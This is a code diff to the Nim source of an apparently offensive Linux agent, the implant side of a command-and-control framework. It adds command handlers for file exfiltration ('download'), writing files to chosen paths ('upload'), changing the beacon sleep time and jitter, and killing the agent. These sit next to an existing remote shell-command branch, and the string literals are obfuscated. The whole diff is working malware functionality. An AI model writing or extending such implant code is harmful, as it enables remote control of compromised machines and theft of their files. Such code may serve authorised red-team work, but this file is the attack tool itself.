@@ -17,6 +17,7 @@ proc linux_parse_command*(command: JsonNode): bool
 
 # Command executors
 proc collect_data(): bool
+proc change_sleep_time(timeframe: int,  jitter_percent: int): bool
 
 # Helpers
 proc get_linux_agent_id*(): string
@@ -99,6 +100,20 @@ proc collect_data(): bool =
     return is_success
 
 
+proc change_sleep_time(timeframe: int,  jitter_percent: int): bool =
+    var is_success: bool
+    call_home_timeframe = timeframe
+    call_home_jitter_percent = jitter_percent
+    
+    var data = {
+        protectString("sleep_timeframe"): $call_home_timeframe,
+        protectString("sleep_jitter_percent"): $call_home_jitter_percent
+    }.toOrderedTable()
+    
+    is_success = post_data(client, protectString("sleep") , $data)
+    return is_success
+
+
 #########################
 ######## Helpers ########
 #########################
@@ -135,8 +150,17 @@ proc linux_parse_command*(command: JsonNode): bool =
     case command_type:
         of protectString("cmd"):
             is_success = run_shell_command(client, command[protectString("shell_command")].getStr())
+        of protectString("download"):
+            is_success = exfil_file(client, command["src_file"].getStr())
+        of protectString("upload"):
+            is_success = write_file(client, command["src_file_data_base64"].getStr(), command["dst_file_path"].getStr()) 
+        of protectString("sleep"):
+            is_success = change_sleep_time(command["timeframe"].getInt(), command[protectString("jitter_percent")].getInt())
         of protectString("collect"):
             is_success = collect_data()
+        of protectString("kill"):
+            kill_agent(client)
+
         else:
             is_success = false
     return is_success
